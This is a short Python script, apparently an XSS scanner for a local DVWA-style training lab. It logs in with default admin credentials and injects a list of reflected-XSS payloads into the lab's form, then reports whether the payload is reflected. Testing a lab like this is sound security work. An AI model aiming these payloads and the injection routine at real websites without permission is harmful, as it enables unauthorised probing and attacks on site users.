# scanner.py 

import requests
from bs4 import BeautifulSoup
import urllib.parse

PAYLOADS = [
    "<script>alert('XSS-AutoPwn')</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]

def scan_url(target_url):
    print(f"[+] Starting XSS scan on: {target_url}")
    results = []
    session = requests.Session()

    try:
        
        login_url = "http://localhost:8080/login.php"
        print(f"[+] Fetching login page...")
        login_page = session.get(login_url, timeout=10)
        soup = BeautifulSoup(login_page.text, 'html.parser')
        token = soup.find('input', {'name': 'user_token'})['value']

        
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login',
            'user_token': token
        }
        print("[+] Logging in...")
        login_resp = session.post(login_url, data=login_data, timeout=10)

        if "Welcome" not in login_resp.text:
            print("[-] Login failed!")
            return []
        print("[+] Login successful!")

        
        xss_page = session.get(target_url, timeout=10)
        soup = BeautifulSoup(xss_page.text, 'html.parser')

        
        form = None
        for f in soup.find_all('form'):
            if f.find('input', {'name': 'name'}):
                form = f
                break

        if not form:
            print("[-] XSS form not found!")
            return []

        print("[i] XSS form found!")

        
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        full_url = urllib.parse.urljoin(target_url, action)
        payload_data = {'name': PAYLOADS[0]}

        print(f"[+] Injecting via {method.upper()}...")
        if method == 'post':
            resp = session.post(full_url, data=payload_data, timeout=10)
        else:
            resp = session.get(full_url, params=payload_data, timeout=10)

        
        if PAYLOADS[0] in resp.text:
            result = {'url': resp.url, 'payload': PAYLOADS[0]}
            results.append(result)
            print(f"[!] XSS EXPLOITED! → {resp.url}")
        else:
            print("[-] Payload not reflected")

    except Exception as e:
        print(f"[x] Error: {e}")

    return results


if __name__ == "__main__":
    findings = scan_url("http://localhost:8080/vulnerabilities/xss_r/")
    print(f"\nScan complete: {len(findings)} XSS found")
